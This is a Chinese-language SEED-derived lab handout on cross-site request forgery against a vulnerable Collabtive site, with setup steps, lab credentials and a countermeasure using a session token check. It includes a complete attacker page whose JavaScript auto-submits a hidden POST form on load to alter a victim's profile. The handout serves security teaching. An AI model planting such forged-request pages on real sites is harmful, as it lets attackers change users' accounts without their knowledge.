# 第 1 节 Collabtive 系统跨站请求伪造攻击实验

## 实验简介

帮助学生理解跨站请求伪造(CSRF 或 XSRF)攻击。CSRF 攻击涉及用户受害者,受信任的网站,恶意网站。受害者与受信任的站点和用户拥有一个活跃的会话同时访问恶意网站。恶意网站注入一个 HTTP 请求为受信任的站点到受害者用户会话牺牲其完整性。

## 实验背景

CSRF 攻击总是涉及到三个角色:信赖的网站(Collabtive),受害者的 session 或 cookie,和一个恶意网站。受害者会同时访问恶意网站与受信任的站点会话的时候。攻击包括一系列步骤，如下:

1.  受害者用户使用他/她的用户名和密码登录到可信站点,从而创建一个新的会话。
2.  受信任站点存储受害者会话的 cookie 或 session 在受害者用户的 web 浏览器端。
3.  受害者用户在不退出信任网站时就去访问恶意网站。
4.  恶意网站的网页发送一个请求到受害者的受信任的站点用户的浏览器。
5.  web 浏览器将自动连接会话 cookie,因为它是恶意的要求针对可信站点。
6.  受信任的站点如果受到 CSRF 攻击,攻击者的一些恶意的请求会被攻击者发送给信任站点。

恶意网站可以建立 HTTP GET 或 POST 请求到受信任的站点。一些 HTML 标签,比如 img iframe,框架,形式没有限制的 URL,可以在他们的使用属性中。img,iframe,框架可用于锻造 GET 请求。HTML 表单标签可用于构造 POST 请求。构造 GET 请求是相对容易的,因为它甚至不需要 JavaScript 的帮助;构造 POST 请求需要 JavaScript。因为 Collabtive 只针对后者,本实验室的任务将只涉及 HTTP POST 请求；

## 预备知识

### 什么是 CSRF？

百度百科--[CSRF](http://baike.baidu.com/link?url=h64nEfsH4Ok8FiOlsEcJuO8UUzbBSy9MeepkimruEVTv0wE7gM54P-0C1tTlUlylwqUXKxK0NBSP6eeyT_Qt7_) CSRF(Cross-site request forgery)：中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF；

作用：攻击者盗用了你的身份，以你的名义发送恶意请求；

危害：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全；

### 环境搭建

启动服务，由于`mysql_safe`不会退出，所以启动后该终端需要保留，在其他终端中执行后续命令：

```
sudo service apache2 start
sudo mysqld_safe 
```

> sudo 密码：dees

服务启动后的截图，请再打开其他终端执行后续命令。

![此处输入图片的描述](img/document-uid13labid876timestamp1445515226388.jpg)

配置 DNS：

```
sudo vim /etc/hosts 
```

![图片描述信息](img/userid13labid876time1429077109376.jpg)

网站配置：

```
sudo vim /etc/apache2/conf.d/lab1.conf 
```

![图片描述信息](img/userid13labid876time1429077154195.jpg)

重启服务：

```
sudo service apache2 restart 
```

访问测试：http://www.csrflabattacker.com

![图片描述信息](img/userid13labid876time1429077196640.jpg)

网站配置：

```
sudo vim /etc/apache2/conf.d/lab2.conf 
```

![图片描述信息](img/userid13labid876time1429077211496.jpg)

重启服务：

```
sudo service apache2 restart 
```

访问测试:http://www.csrflabcollabtive.com

![图片描述信息](img/userid13labid876time1429077222967.jpg)

**注：两个配置文件不同同时存在，否则 Apache 会出错，如果需要测试，建议把其中一个的端口修改为 8080**

![图片描述信息](img/userid13labid876time1429077233024.jpg)

这个时候我们就可以同时访问两个网站了~~~

## 实验任务

实验环境介绍：第一个网站是脆弱 Collabtive 网站 www.csrflabcollabtive.com 在虚拟机访问。第二个网站是攻击者的恶意网站,用于攻击 Collabtive。本网站内可以通过 www.csrflabattacker.com 访问虚拟机。

### lab1 修改受害者的信息

step1:启动 mysql 数据库:

```
sudo mysqld_safe 
```

step2:访问 www.csrflabcollabtive.com 并进行登录。

>用户：admin 密码：admin

step3:我们登陆了自己的用户，当我们希望可以修改别人的用户时，我们需要知道修改数据时的数据流，这个时候我们可以使用 firefox 浏览器自带的 LiveHttpHeader 插件来进行抓包获取修改用户时候的 http 消息；

点击菜单栏 tools-LiveHttpHeader，然后访问编辑用户页面；

![图片描述信息](img/userid13labid876time1429077485549.jpg)

![图片描述信息](img/userid13labid876time1429077497500.jpg)

通过抓取的信息，我们可以得知：

验证页面：http://www.csfrlabcollabtive.com/manageuser.php?action=edit

用户姓名 id:name；company；email 等等信息我们都可以进行修改；

**这里最好使用其他用户进行测试**

但是用户修改用户的方式 post 提交，我们就需要自己构造一个危险页面

```
>     <html><body><h1>
>     This page forges an HTTP POST request.
>     </h1>
>     <script>
>     function post(url,fields)
>     {
>     //create a <formelement.
>     var p = document.createElement('form');
>     //construct the form
>     p.action = url;
>     p.innerHTML = fields;
>     p.target = '_self';
>     p.method = 'post';
>     //append the form to the current page.
>     document.body.appendChild(p);
>     //submit the form
>     p.submit();
>     }
>     function csrf_hack()
>     {
>     var fields;
>     // The following are form entries that need to be filled out
>     // by attackers. The entries are made hidden, so the victim
>     // won't be able to see them.
>     fields += "<input type='hidden' name='name' value='peter'>"; //修改用户名
>     fields += "<input type='hidden' name='userfile' value=''>";  
>     fields += "<input type='hidden' name='company' value='seed'>";  //修改公司名
>     post('http://www.csrflabcollabtive/manageuser.php?action=edit',fields);
>     }
>     // invoke csrf_hack() after the page is loaded.
>     window.onload = function() { csrf_hack(); }
>     </script>
>     </body></html> 
```

将上面的代码保存为 index.html 并放在/var/www/CSRF/Attacker/文件夹下，当用户没有退出，就去访问了 www.csrflabattacker.com 就会对 collabtive 网站的用户信息进行修改；下面进行测试：

访问前，注意用户的姓名还有 company：

![图片描述信息](img/userid13labid876time1429077513440.jpg)

访问攻击者页面，当然页面还可以进行变形做的更加隐秘，甚至让用户完全不能察觉：

![图片描述信息](img/userid13labid876time1429077535479.jpg)

再次查看用户信息，这个时候我们就会发现用户变成了我们的期望值了：

![图片描述信息](img/userid13labid876time1429077546857.jpg)

#### 原理解析

攻击者模拟一个页面进行自动提交，当用户访问这个页面时，相当于用户自己去修改信息，服务器不会判断是人发起的害死自动发起的，这个时候漏洞就产生了！

### lab2 对 Collabtive 实施防御对策

服务端防御：放映厅 CSRF 方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数；

编辑验证文件

```
sudo vim /var/www/CSRF/Collabtive/templates/standard/edituserform.tpl 
```

![图片描述信息](img/userid13labid876time1429077560187.jpg)

![图片描述信息](img/userid13labid876time1429077568138.jpg)

保存并退出，然后修改 manageuser.php 文件

![图片描述信息](img/userid13labid876time1429077576553.jpg)

这一行是获取用户提交过来的 sid 值；添加位置可以适当变化；

![图片描述信息](img/userid13labid876time1429077583942.jpg)

这一行是对用户 sid 值进行判断，是否等于 phpsessid 的值，如果相等就可以进行对用户编辑，这样当攻击者想攻击时，就不能通过验证了；这里需要注意的是，if 需要对整个编辑内容进行判断；所以要注意括号闭合的位置，应该是$action="edit"整个内容；

然后我们再进行 lab1 中的实验，就会不成功了！

#### 原理

因为攻击者不能获得第三方的 Cookie(理论上)

#### 思考--你能绕过这个对策?

答案：这个方法个人觉得已经可以杜绝 99%的 CSRF 攻击了，那还有 1%呢....由于用户的 Cookie 很容易由于网站的 XSS 漏洞而被盗取，这就另外的 1%。一般的攻击者看到有需要算 Hash 值，基本都会放弃了，某些除外，所以如果需要 100%的杜绝，这个不是最好的方法；

## 作业

你需要提交一份详细的实验报告来描述你做了什么和你所学到的。

请提供使用 LiveHTTPHeaders Wiresharkde 细节或屏幕截图。

您还需要提供有趣的或令人惊讶的解释。

## license

本实验所涉及的实验环境来自[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)，并在此基础上为适配实验室我那工作环境进行修改，修改后的实验文档仍然遵循 GUN Free Documentation License

附[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)版权说明：

Copyright

c 2006 - 2011 Wenliang Du, Syracuse University. The development of this document is/was funded by three grants from the US National Science Foundation: Awards No. 0231122 and 0618680 from TUES/CCLI and Award No. 1017771 from Trustworthy Computing. Permission is granted to copy, distribute and/or modify this document under the terms of the GNU Free Documentation License, Version 1.2 or any later version published by the Free Software Foundation. A copy of the license can be found at http://www.gnu.org/licenses/fdl.html.